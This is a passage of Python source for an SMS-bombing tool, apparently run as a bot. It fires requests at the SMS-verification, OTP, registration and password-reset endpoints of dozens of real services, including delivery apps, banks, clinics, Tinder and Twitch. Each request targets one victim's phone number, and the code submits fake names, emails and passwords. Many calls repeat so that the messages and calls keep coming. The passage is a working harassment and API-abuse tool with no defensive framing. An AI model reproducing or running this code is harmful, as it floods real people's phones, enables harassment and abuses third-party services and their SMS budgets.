            requests.post('https://smart.space/api/users/request_confirmation_code/', json={"mobile": "+" + _phone, "action": "confirm_mobile"})
            print('[@'+str(bot_username)+'] [+] Smart.Space отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={"phone": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] KFC отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
       
        try:
            requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php', data={'action': 'ajax_register_user', 'step': '1', 'security_login': '50a8c243f6', 'phone': _phone})
            print('[@'+str(bot_username)+'] [+] tarantino-family отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://apteka.ru/_action/auth/getForm/', data={"form[NAME]": "","form[PERSONAL_GENDER]": "", "form[PERSONAL_BIRTHDAY]": "", "form[EMAIL]": "","form[LOGIN]": (_phone, "+* (***) ***-**-**"),"form[PASSWORD]": password,"get-new-password": "Получите пароль по SMS","user_agreement": "on","personal_data_agreement": "on","formType": "simple", "utc_offset": "120",})
            print('[@'+str(bot_username)+'] [+] Apteka отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://uklon.com.ua/api/v1/account/code/send', headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] Uklon отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://www.ozon.ru/api/composer-api.bx/_action/fastEntry', json={"phone": _phone, "otpId": 0})
            print('[@'+str(bot_username)+'] [+] Ozon отправлен!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.get('https://requests.service.banki.ru/form/960/submit', params={"callback": "submitCallback","name": _name,"phone": "+" + _phone,"email": _email,"gorod": "Москва","approving_data": "1",})
            print('[@'+str(bot_username)+'] [+] Banki отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
        
        try:
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] IVI отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://www.moyo.ua/identity/registration', data={"firstname": _name, "phone": _phone,"email":_email})
            print('[@'+str(bot_username)+'] [+] Moyo отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')
       
        try:
            requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
            print('[@'+str(bot_username)+'] [+] Helsi отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [+] не отправлено!')
        
        try:
            requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"}, json={"Phone": _phone, "Type": 1})
            print('[@'+str(bot_username)+'] [+] KinoLend отправлен!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
            print('[@'+str(bot_username)+'] [+] PizzaHut sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
            print('[@'+str(bot_username)+'] [+] Rabota sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
            print('[@'+str(bot_username)+'] [+] Rutube sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] Rutube in sent!')
     
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
            print('[@'+str(bot_username)+'] [+] Citilink sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
            print('[@'+str(bot_username)+'] [+] Smsint sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
            print('[@'+str(bot_username)+'] [+] oyorooms sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode', params={"pageName":"registerPrivateUserPhoneVerificatio"}, data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": "",})
            print('[@'+str(bot_username)+'] [+] MVIDEO sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
            print('[@'+str(bot_username)+'] [+] newnext sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            print('[@'+str(bot_username)+'] [+] Sunlight sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
            print('[@'+str(bot_username)+'] [+] alpari sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            print('[@'+str(bot_username)+'] [+] Invitro sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
            print('[@'+str(bot_username)+'] [+] Sberbank sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
            print('[@'+str(bot_username)+'] [+] Psbank sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
            print('[@'+str(bot_username)+'] [+] Beltelcom sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
            print('[@'+str(bot_username)+'] [+] Karusel sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
            print('[@'+str(bot_username)+'] [+] KFC sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://api.chef.yandex/api/v2/auth/sms', json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] Yandex.Chef sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code', params={"msisdn": _phone})
            print('[@'+str(bot_username)+'] [+] MTS отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post("https://api.delitime.ru/api/v2/signup", data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            print('[@'+str(bot_username)+'] [+] Delitime sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
            print('[@'+str(bot_username)+'] [+] findclone звонок отправлен!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post("https://guru.taxi/api/v1/driver/session/verify", json={"phone": {"code": 1, "number": _phone}})
            print('[@'+str(bot_username)+'] [+] Guru sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php', data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            print('[@'+str(bot_username)+'] [+] ICQ sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru", data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
            print('[@'+str(bot_username)+'] [+] InDriver sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://lk.invitro.ru/sp/mobileApi/createUserByPassword', data={"password": password,"application": "lkp","login": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] Invitro отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] Pmsm sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] IVI sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
            print('[@'+str(bot_username)+'] [+] Lenta sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink', json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
            print('[@'+str(bot_username)+'] [+] Mail.ru sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode', params={"pageName": "registerPrivateUserPhoneVerificatio"}, data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            print('[@'+str(bot_username)+'] [+] MVideo sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data={"st.r.phone": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] OK sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] qlean sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')
            
        try:
            requests.post('https://sso.cloud.qlean.ru/http/users/requestotp', headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"}, params={"phone": _phone, "clientId":"undefined", "sessionId": str(randint(5000, 9999))})
            print('[@'+str(bot_username)+'] [+] Qlean отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] не отправлено!')

        try:
            requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
            print('[@'+str(bot_username)+'] [+] SMSgorod sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone})
            print('[@'+str(bot_username)+'] [+] Tinder sent!')
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true', json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
            print('[@'+str(bot_username)+'] [+] Twitch sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
            print('[@'+str(bot_username)+'] [+] CabWiFi sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
            print('[@'+str(bot_username)+'] [+] wowworks sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={"phone_number": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] Eda.Yandex sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            print('[@'+str(bot_username)+'] [+] Youla sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
            print('[@'+str(bot_username)+'] [+] Alpari sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] SMS sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')

        try:
            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] Delivery sent!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] error in sent!')
#repeat   
        try:
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
            print('[@'+str(bot_username)+'] [+] Grab отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://api.chef.yandex/api/v2/auth/sms', json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] chef отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!') 
            
        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
            print('[@'+str(bot_username)+'] [+] lenta отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!') 
          
        try:
            requests.post('https://dostavista.ru/backend/send-verification-sms', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] dos отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!') 
            
        try:
            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
            print('[@'+str(bot_username)+'] [+] RuTaxi отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
            print('[@'+str(bot_username)+'] [+] BelkaCar отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
        
        try:
            requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})
            print('[@'+str(bot_username)+'] [+] secure отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
            
        try:
            requests.post('https://cabinet.planetakino.ua/service/sms', params={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] planetakino отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')    
            
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] pmsm отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] ivi отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')        
            
            
            
            
        try:
            requests.get('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] finam отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
        
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            print('[@'+str(bot_username)+'] [+] mtstv отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
            
        try:
            requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] games отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')   
            
        try:
            requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone})
            print('[@'+str(bot_username)+'] [+] kasta отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')      
            
        try:
            requests.post('https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/', data={"RECALL": "Y", "BACK_CALL_PHONE": _phone})
            print('[@'+str(bot_username)+'] [+] ritm отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
            
        try:
            requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone})
            print('[@'+str(bot_username)+'] [+] city24 отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')    
            
        try:
            requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] sushi-master отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
            
        try:
            requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
            print('[@'+str(bot_username)+'] [+] plex отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')    

        try:
            requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] vsk отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
            
            
            
            
        try:
            requests.get('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20326-87-32', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] sportmaster отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
            
        try:
            requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] korona отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
        
        try:
            requests.post('https://btfair.site/api/user/phone/code', json={"phone": "+" + _phone,})
            print('[@'+str(bot_username)+'] [+] btfair отправлено!')
            time.sleep(0.1)
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
            
        try:
            requests.post('https://thehive.pro/auth/signup', json={"phone": "+" + _phone,})
            print('[@'+str(bot_username)+'] [+] thehive отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
        
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
            print('[@'+str(bot_username)+'] [+] Tinder отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
            print('[@'+str(bot_username)+'] [+] Karusel отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
            print('[@'+str(bot_username)+'] [+] Tinkoff отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            print('[@'+str(bot_username)+'] [+] MTS отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            print('[@'+str(bot_username)+'] [+] Youla отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
            print('[@'+str(bot_username)+'] [+] PizzaHut отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
            print('[@'+str(bot_username)+'] [+] Rabota отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
            print('[@'+str(bot_username)+'] [+] Rutube отправлено!')
        except:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
            print('[@'+str(bot_username)+'] [+] Citilink отправлено!')

        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
            print('[@'+str(bot_username)+'] [+] Smsint отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
            print('[@'+str(bot_username)+'] [+] oyorooms отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
            print('[@'+str(bot_username)+'] [+] MVideo отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
            print('[@'+str(bot_username)+'] [+] newnext отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            print('[@'+str(bot_username)+'] [+] Sunlight отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
            print('[@'+str(bot_username)+'] [+] alpari отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            print('[@'+str(bot_username)+'] [+] Invitro отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
            print('[@'+str(bot_username)+'] [+] Sberbank отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
            print('[@'+str(bot_username)+'] [+] Psbank отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
            print('[@'+str(bot_username)+'] [+] Beltelcom отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
            print('[@'+str(bot_username)+'] [+] Karusel отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')
            
        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
            print('[@'+str(bot_username)+'] [+] KFC отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
            print('[@'+str(bot_username)+'] [+] carsmile отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            print('[@'+str(bot_username)+'] [+] Citilink отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            print('[@'+str(bot_username)+'] [+] Delitime отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
            print('[@'+str(bot_username)+'] [+] findclone звонок отправлен!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            print('[@'+str(bot_username)+'] [+] ICQ отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
            print('[@'+str(bot_username)+'] [+] InDriver отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] Invitro отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] Pmsm отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] IVI отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
            print('[@'+str(bot_username)+'] [+] Mail.ru отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            print('[@'+str(bot_username)+'] [+] MVideo отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
            print('[@'+str(bot_username)+'] [+] OK отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
            requests.post('https://plink.tech/register/',json={"phone": _phone})
            print('[@'+str(bot_username)+'] [+] Plink отправлено!')
        except:
            print('[@'+str(bot_username)+'] [-] Не отправлено!')

        try:
